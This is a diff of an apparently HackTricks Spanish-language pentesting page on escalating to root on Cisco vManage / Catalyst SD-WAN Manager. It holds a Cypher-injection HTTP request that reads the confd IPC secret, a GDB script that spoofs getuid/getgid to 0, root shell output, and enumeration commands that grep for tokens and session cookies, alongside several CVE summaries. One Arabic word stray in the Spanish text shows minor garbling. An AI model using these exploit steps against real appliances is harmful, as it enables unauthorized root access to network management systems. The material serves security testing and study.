@@ -2,17 +2,33 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-## Ruta 1
+Una vez que tienes ejecución de código en Cisco vManage / *Catalyst SD-WAN Manager* como `vmanage`, `netadmin` o `vmanage-admin`, las superficies locales más interesantes para privesc suelen ser la pila CLI de `confd`, el helper `cmdptywrapper`, las APIs REST en localhost y los handlers de import/upload propiedad de root.
+
+Si todavía necesitas el **initial foothold** en un controller, revisa primero la página dedicada al control plane:
+
+{{#ref}}
+../../network-services-pentesting/12346-udp-pentesting-cisco-sd-wan-control-plane.md
+{{#endref}}
+
+## Quick local triage
+```bash
+ps auxww | egrep 'confd|cmdptywrapper|neo4j|vdaemon'
+ss -lntp | egrep '4565|830'
+ls -l /etc/confd/confd_ipc_secret /usr/bin/confd_cli /usr/bin/confd_cli_user
+```
+Si `/etc/confd/confd_ipc_secret` es legible desde tu foothold, Path 1 y Path 2 se vuelven inmediatamente prácticos.
+
+## Path 1
 
 (Ejemplo de [https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html](https://www.synacktiv.com/en/publications/pentesting-cisco-sd-wan-part-1-attacking-vmanage.html))
 
-Tras indagar un poco en cierta [documentation](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los diferentes binarios (accesibles con una cuenta en el sitio de Cisco), descubrimos que para autenticar el socket IPC, usa un secreto ubicado en `/etc/confd/confd_ipc_secret`:
+Después de investigar un poco en cierta [documentación](http://66.218.245.39/doc/html/rn03re18.html) relacionada con `confd` y los distintos binaries (accesible con una cuenta en el sitio web de Cisco), encontramos que para autenticar el socket IPC, usa un secret ubicado en `/etc/confd/confd_ipc_secret`:
 ```
 vmanage:~$ ls -al /etc/confd/confd_ipc_secret
 
 -rw-r----- 1 vmanage vmanage 42 Mar 12 15:47 /etc/confd/confd_ipc_secret
 ```
-¿Recuerdas nuestra instancia Neo4j? Se está ejecutando con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo usando la vulnerabilidad anterior:
+¿Recuerdas nuestra instancia de Neo4j? Está ejecutándose con los privilegios del usuario `vmanage`, lo que nos permite recuperar el archivo usando la vulnerabilidad anterior:
 ```
 GET /dataservice/group/devices?groupId=test\\\'<>\"test\\\\")+RETURN+n+UNION+LOAD+CSV+FROM+\"file:///etc/confd/confd_ipc_secret\"+AS+n+RETURN+n+//+' HTTP/1.1
 
@@ -24,7 +40,7 @@ Host: vmanage-XXXXXX.viptela.net
 
 "data":[{"n":["3708798204-3215954596-439621029-1529380576"]}]}
 ```
-El programa `confd_cli` no soporta argumentos en la línea de comandos, pero llama a `/usr/bin/confd_cli_user` con argumentos. Por lo tanto, podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo del rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener la shell:
+El programa `confd_cli` no soporta argumentos de línea de comandos pero llama a `/usr/bin/confd_cli_user` con argumentos. Así que podríamos llamar directamente a `/usr/bin/confd_cli_user` con nuestro propio conjunto de argumentos. Sin embargo, no es legible con nuestros privilegios actuales, así que tenemos que recuperarlo desde el rootfs y copiarlo usando scp, leer la ayuda y usarlo para obtener la shell:
 ```
 vManage:~$ echo -n "3708798204-3215954596-439621029-1529380576" > /tmp/ipc_secret
 
@@ -42,16 +58,16 @@ vManage:~# id
 
 uid=0(root) gid=0(root) groups=0(root)
 ```
-## Ruta 2
+## Path 2
 
-(Example from [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
+(Ejemplo de [https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77](https://medium.com/walmartglobaltech/hacking-cisco-sd-wan-vmanage-19-2-2-from-csrf-to-remote-code-execution-5f73e2913e77))
 
-El blog¹ del equipo synacktiv describió una forma elegante de conseguir un root shell, pero la salvedad es que requiere obtener una copia de `/usr/bin/confd_cli_user`, que solo es legible por root. Encontré otra manera de escalar a root sin esa complicación.
+El blog¹ del equipo synacktiv describía una forma elegante de obtener una root shell, pero la salvedad es que requiere conseguir una copia de `/usr/bin/confd_cli_user`, que solo puede ser leída por root. Encontré otra manera de escalar a root sin tanta complicación.
 
 Cuando desensamblé el binario `/usr/bin/confd_cli`, observé lo siguiente:
 
 <details>
-<summary>Objdump que muestra la recolección de UID/GID</summary>
+<summary>Objdump mostrando la recolección de UID/GID</summary>
 ```asm
 vmanage:~$ objdump -d /usr/bin/confd_cli
 … snipped …
@@ -82,20 +98,20 @@ vmanage:~$ objdump -d /usr/bin/confd_cli
 ```
 </details>
 
-Cuando ejecuto “ps aux”, observé lo siguiente (_nota -g 100 -u 107_)
+Cuando ejecuté “ps aux”, observé lo siguiente (_nota -g 100 -u 107_)
 ```
 vmanage:~$ ps aux
 … snipped …
 root     28644  0.0  0.0   8364   652 ?        Ss   18:06   0:00 /usr/lib/confd/lib/core/confd/priv/cmdptywrapper -I 127.0.0.1 -p 4565 -i 1015 -H /home/neteng -N neteng -m 2232 -t xterm-256color -U 1358 -w 190 -h 43 -c /home/neteng -g 100 -u 1007 bash
 … snipped …
 ```
-Plantee la hipótesis de que el programa “confd_cli” pasa el ID de usuario y el ID de grupo que obtuvo del usuario conectado a la aplicación “cmdptywrapper”.
+Hipoteticé que el programa “confd_cli” pasa el ID de usuario y el ID de grupo que recopiló del usuario autenticado a la aplicación “cmdptywrapper”.
 
-Mi primer intento fue ejecutar “cmdptywrapper” directamente y proporcionarle `-g 0 -u 0`, pero falló. Al parecer se creó un descriptor de archivo (-i 1015) en algún punto y no puedo falsificarlo.
+Mi primer intento fue ejecutar “cmdptywrapper” directamente y suministrarle `-g 0 -u 0`, pero falló. Parece que se creó un descriptor de archivo (-i 1015) en algún punto del proceso y no puedo falsificarlo.
 
-Como se menciona en el blog de synacktiv (último ejemplo), el programa `confd_cli` no soporta argumentos de línea de comandos, pero puedo influenciarlo con un depurador y afortunadamente GDB está incluido en el sistema.
+Como se mencionó en el blog de synacktiv(último ejemplo), el programa “confd_cli” no admite argumentos de línea de comandos, pero puedo influir en él con un debugger y, por suerte, GDB está incluido en el sistema.
 
-Creé un script de GDB donde obligué a la API `getuid` y `getgid` a devolver 0. Dado que ya tengo privilegio “vmanage” a través del deserialization RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.
+Creé un script de GDB en el que forcé a la API `getuid` y `getgid` a devolver 0. Como ya tengo privilegio “vmanage” a través del deserialization RCE, tengo permiso para leer directamente `/etc/confd/confd_ipc_secret`.
 
 root.gdb:
 ```
@@ -115,8 +131,6 @@ root
 end
 run
 ```
-Salida de la consola:
-
 <details>
 <summary>Salida de la consola</summary>
 ```text
@@ -154,23 +168,66 @@ bash-4.4#
 ```
 </details>
 
-## Ruta 3 (bug de validación de entrada de la CLI de 2025)
+## Path 3 (2025 CLI input validation bug - CVE-2025-20122)
 
-Cisco renombró vManage a *Catalyst SD-WAN Manager*, pero la CLI subyacente todavía se ejecuta en la misma máquina. Un advisory de 2025 (CVE-2025-20122) describe una validación insuficiente de entrada en la CLI que permite que **cualquier usuario local autenticado** obtenga root al enviar una petición especialmente construida al servicio CLI del manager. Combina cualquier foothold de bajo privilegio (p. ej., la deserialización de Neo4j de Path1, o un shell de usuario de cron/backup) con este fallo para escalar a root sin copiar `confd_cli_user` ni adjuntar GDB:
+Cisco más tarde documentó una ruta local más limpia hacia root en su propio advisory para [CVE-2025-20122](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-priviesc-WCk7bmmt): un **atacante autenticado con solo privilegios de solo lectura** podía enviar una request manipulada al manager CLI y saltar a root debido a una validación de input insuficiente.
 
-1. Usa tu shell de bajo privilegio para localizar el endpoint IPC de la CLI (típicamente el listener `cmdptywrapper` mostrado en el puerto 4565 en Path2).
-2. Construye una petición de CLI que falsifique los campos UID/GID a 0. El bug de validación no aplica el UID del llamante original, por lo que el wrapper lanza un PTY respaldado por root.
-3. Envía cualquier secuencia de comandos (`vshell; id`) a través de la petición falsificada para obtener un shell con root.
+Desde una perspectiva ofensiva, esta es la conclusión importante:
 
-> La superficie de explotación es local-only; remote code execution sigue siendo necesaria para conseguir la shell inicial, pero una vez dentro de la máquina la explotación es un único mensaje IPC en lugar de un parche de UID mediante debugger.
+1. Una vez que tienes *cualquier* foothold de bajos privilegios en la máquina, deberías probar el servicio local de CLI antes de ir por el flujo más pesado de Path 1 / Path 2.
+2. Reutiliza los artefactos de Path 2 para encontrar el trust boundary: `confd_cli` → `cmdptywrapper` → `vshell`.
+3. Trata cada campo reenviado al backend de CLI como sospechoso: UID/GID, username, metadata de terminal, archivos importados, o cualquier valor consumido más tarde por un helper propiedad de root.
+4. Si un usuario de bajos privilegios puede الوصول al local CLI socket e influir en esos campos, root puede estar a solo una request manipulada de distancia.
 
-## Otras vulnerabilidades recientes de vManage/Catalyst SD-WAN Manager para encadenar
+Un flujo de trabajo práctico después de aterrizar en el appliance es:
+```bash
+strings /usr/bin/confd_cli | egrep 'cmdptywrapper|vshell|confd'
+strace -f -s 200 -o /tmp/confd.trace /usr/bin/confd_cli
+ss -lntp | grep 4565
+```
+Esto convierte el bug de 2025 en un buen patrón de hunting para versiones similares: busca **local CLI shims que recopilan identidad en userland y la reenvían a un wrapper más privilegiado**.
 
-* **Authenticated UI XSS (CVE-2024-20475)** – Inyecta JavaScript en campos específicos de la interfaz; robar una sesión de administrador te da un camino desde el navegador hasta `vshell` → shell local → Path3 para root.
+## Path 4 (2026 low-priv REST API to root - CVE-2026-20126)
 
-## Referencias
+El advisory de Cisco de febrero de 2026 también introdujo otra clase útil de privesc: [CVE-2026-20126](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v) permitía a un **authenticated, local attacker with low privileges** obtener root debido a un mecanismo de autenticación de usuario insuficiente en la REST API.
 
-- [Cisco Catalyst SD-WAN Manager Privilege Escalation Vulnerability (CVE-2025-20122)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-priviesc-WCk7bmmt.html)
-- [Cisco Catalyst SD-WAN Manager Cross-Site Scripting Vulnerability (CVE-2024-20475)](https://www.cisco.com/c/en/us/support/docs/csa/cisco-sa-sdwan-xss-zQ4KPvYd.html)
+Esto importa porque la privesc en vManage ya no se limita solo al abuso de `confd`/TTY. Después de obtener un shell de bajo privilegio, busca también:
+
+- endpoints de API solo para localhost que confíen demasiado en el caller
+- tokens, cookies o credenciales de servicio legibles desde la cuenta actual
+- acciones solo para root expuestas a través de handlers `dataservice`/REST que aún pueden activarse localmente
+
+En la práctica, una vez que tienes un shell como `vmanage` u otro usuario de servicio, el abuso local de la API suele ser más silencioso y más fácil de automatizar que el abuso interactivo de la CLI:
+```bash
+env | grep -iE 'token|cookie|session'
+grep -R "dataservice" /etc /opt 2>/dev/null | head
+ss -lntp | grep -E '(:443|:8443)'
+```
+Si el contexto de la sesión local es suficiente para alcanzar funcionalidad REST privilegiada, prefiere la ruta de la API: es más fácil de reproducir, automatizar y encadenar con sesiones web robadas o tokens de API.
+
+## Path 5 (2026 crafted file processed by root - CVE-2026-20245)
+
+Otro patrón reciente es [CVE-2026-20245](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx): un atacante local con privilegios `netadmin` podría subir un **crafted file** que luego la CLI manejaba de forma insegura, lo que llevaba a command injection como `root`.
+
+Desde el punto de vista de HackTricks, la técnica valiosa es más amplia que el CVE específico:
+
+1. Enumera cada workflow de CLI o web que acepte un archivo: imports, diagnostic bundles, templates, validators, backups, tenant data, etc.
+2. Rastrea dónde termina el archivo subido y qué script o binario propiedad de root lo consume.
+3. Prueba si el filename, el contenido del archivo o los metadatos parseados se pasan alguna vez a shell commands, wrapper scripts o ayudantes estilo `system()`.
+4. Si ya puedes alcanzar `netadmin` (credenciales válidas, sesión robada o una cadena de auth-bypass), los bugs de procesamiento de archivos suelen ser la vía más rápida hacia root.
+
+Esta clase de bug encadena especialmente bien con footholds remotos que otorgan `netadmin` pero no `root`.
+
+## Other recent vManage/Catalyst SD-WAN Manager vulns to chain
+
+- **Authenticated UI XSS (CVE-2024-20475)** – Roba una sesión de admin en la web UI, luego pivota hacia acciones de API/CLI que finalmente llegan a `vshell` o a una de las rutas de privesc locales anteriores.
+- **Remote auth bypass to `netadmin` (CVE-2026-20129)** – Muy buen precursor para Path 5 porque `netadmin` es exactamente el nivel requerido por la crafted-file privesc de 2026.
+- **Authenticated arbitrary file write (CVE-2026-20262)** – Útil para dejar archivos que luego sean parseados por componentes privilegiados o para sobrescribir artefactos operativos consumidos por ayudantes propiedad de root.
+- **Pre-auth control-plane auth bypass (CVE-2026-20182)** – Mejor documentado en la página dedicada de SD-WAN control-plane; puede añadir una SSH key para `vmanage-admin`, dándote el foothold local necesario para volver a esta página.
+
+## References
+
+- [Cisco Catalyst SD-WAN Vulnerabilities (CVE-2026-20126, CVE-2026-20129, etc.)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-authbp-qwCX8D4v)
+- [Cisco Catalyst SD-WAN Controller, Catalyst SD-WAN Manager, and Catalyst SD-WAN Validator Authenticated Privilege Escalation Vulnerability (CVE-2026-20245)](https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-sdwan-privesc-4uxFrdzx)
 
 {{#include ../../banners/hacktricks-training.md}}
